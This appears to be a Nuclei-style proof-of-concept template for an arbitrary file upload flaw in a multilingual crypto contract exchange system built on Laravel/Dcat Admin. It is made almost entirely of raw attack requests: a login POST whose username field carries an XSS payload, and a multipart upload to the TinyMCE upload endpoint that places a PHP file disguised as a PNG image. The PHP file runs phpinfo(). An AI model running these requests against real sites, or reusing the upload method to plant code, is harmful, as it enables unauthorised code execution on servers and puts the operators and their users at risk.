id: poc-nfo9fgllmslqgutf
info:
  name: 10005-19国语言合约交易所系统upload_token文件上传漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,2025
http:
- raw:
  - 'POST /admin/auth/login HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 104

    Accept: */*

    X-CSRF-TOKEN: O7VtLNisPQtu1CjviD0R3SPV4OeZQatFDOWbtmr3

    X-Requested-With: XMLHttpRequest

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    _token=O7VtLNisPQtu1CjviD0R3SPV4OeZQatFDOWbtmr3&username=<img src=1 onerro

    r=alert(666);>&password=111111


    位于 /vendor/dcat/laravel-admin/src/Controllers/TinymceController.php 控制器利⽤

    DcatApi 的上传接⼝即可成功 Upload 任意⽂件'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /admin/dcat-api/tinymce/upload?_token=AHeVBtO0SiRu8T1OymnB0FjzMLdPiueuSPhrb679&dir=/ HTTP/1.1

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7

    Cache-Control: no-cache

    Connection: keep-alive

    Content-Length: 198

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzAKBjt33dEezyqIc

    Pragma: no-cache

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

    ------WebKitFormBoundaryzAKBjt33dEezyqIc

    Content-Disposition: form-data; name="file"; filename="aaa.php"

    Content-Type: image/png

    <?php phpinfo();?>

    ------WebKitFormBoundaryzAKBjt33dEezyqIc--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
